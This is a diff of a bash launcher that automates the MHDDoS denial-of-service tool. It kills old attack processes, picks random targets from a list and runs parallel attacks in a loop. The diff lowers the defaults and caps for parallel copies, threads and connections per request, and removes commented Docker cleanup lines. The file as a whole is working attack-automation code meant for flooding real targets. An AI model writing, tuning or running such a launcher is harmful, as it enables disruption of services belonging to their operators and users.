@@ -9,10 +9,6 @@ echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes
 sudo pkill -e -f runner.py
 sudo pkill -e -f ./start.py
 echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
-# for Docker
-#echo "Kill all useless docker-containers with MHDDoS"
-#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-#echo "Docker useless containers killed"
 
 sudo git config --global --add safe.directory /home/${USER}/auto_mhddos_alexnest
 sudo git config --global --add safe.directory /home/${USER}/mhddos_proxy
@@ -20,31 +16,31 @@ sudo git config --global --add safe.directory /home/${USER}/mhddos_proxy
 num_of_copies="${1:-1}"
 if [[ "$num_of_copies" == "all" ]];
 then	
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
-	num_of_copies=3
-elif ((num_of_copies > 3));
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 2 parallel attacks (more than 2 is not effective)\033[0;0m\n"
+	num_of_copies=2
+elif ((num_of_copies > 2));
 then 
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 3 parallel attacks (more than 3 is not effective)\033[0;0m\n"
-	num_of_copies=3
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 2 parallel attacks (more than 2 is not effective)\033[0;0m\n"
+	num_of_copies=2
 elif ((num_of_copies < 1));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack (less than 1 is not effective)\033[0;0m\n"
 	num_of_copies=1
-elif ((num_of_copies != 1 && num_of_copies != 2 && num_of_copies != 3));
+elif ((num_of_copies != 1 && num_of_copies != 2));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mScript will be started with 1 parallel attack\033[0;0m\n"
 	num_of_copies=1
 fi
 
-threads="${2:-1500}"
-if ((threads < 1000));
+threads="${2:-1000}"
+if ((threads < 500));
 then
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 1000 threads\033[0;0m\n"
-	threads=1000
-elif ((threads > 6000));
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too LOW amount of threads - attack will be started with 500 threads\033[0;0m\n"
+	threads=500
+elif ((threads > 4000));
 then
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 6000 threads\033[0;0m\n"
-	threads=6000
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$threads is too HIGH amount of threads - attack will be started with 4000 threads\033[0;0m\n"
+	threads=4000
 fi
 
 rpc="${3:-1000}"
@@ -52,10 +48,10 @@ if ((rpc < 1000));
 then
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too LOW amount of rpc(connections) - attack will be started with 1000 rpc(connections)\033[0;0m\n"
 	rpc=1000
-elif ((rpc > 5000));
+elif ((rpc > 2500));
 then
-	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 5000 rpc(connections)\033[0;0m\n"
-	rpc=5000
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33m$rpc is too HIGH amount of rpc(connections) - attack will be started with 2500 rpc(connections)\033[0;0m\n"
+	rpc=2500
 fi
 
 debug="${4:-}"
@@ -114,26 +110,10 @@ do
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
 	
-   	if (("$num_of_copies" == "all"));
-	then	
-		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
-		then
-			random_numbers=$(shuf -i 1-$list_size -n 3)
-		else
-			random_numbers=$(shuf -i 1-$list_size -n $list_size)
-		fi
-	elif ((num_of_copies > list_size));
+   	
+	if ((num_of_copies > list_size));
 	then 
-		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
-		then
-			random_numbers=$(shuf -i 1-$list_size -n 3)
-		else
-			random_numbers=$(shuf -i 1-$list_size -n $list_size)
-		fi
-	elif ((num_of_copies < 1));
-	then
-		num_of_copies=1
-		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
+		random_numbers=$(shuf -i 1-$list_size -n $list_size)
 	else
 		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
 	fi
@@ -170,9 +150,4 @@ do
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
 	sleep $no_ddos_sleep
 	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mRESTARTING\033[0m\n"
-	
-	# for docker
-   	#echo "Kill all useless docker-containers with MHDDoS"
-   	#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
-   	#echo "Docker useless containers killed"
 done
